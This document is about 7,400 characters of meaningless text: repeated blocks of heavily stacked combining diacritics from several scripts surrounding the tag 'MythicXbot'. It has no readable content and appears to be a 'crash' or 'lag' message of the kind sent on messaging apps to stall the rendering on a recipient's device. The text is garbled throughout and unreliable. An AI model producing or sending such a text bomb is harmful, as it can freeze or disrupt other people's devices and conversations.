๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭99**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭99**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠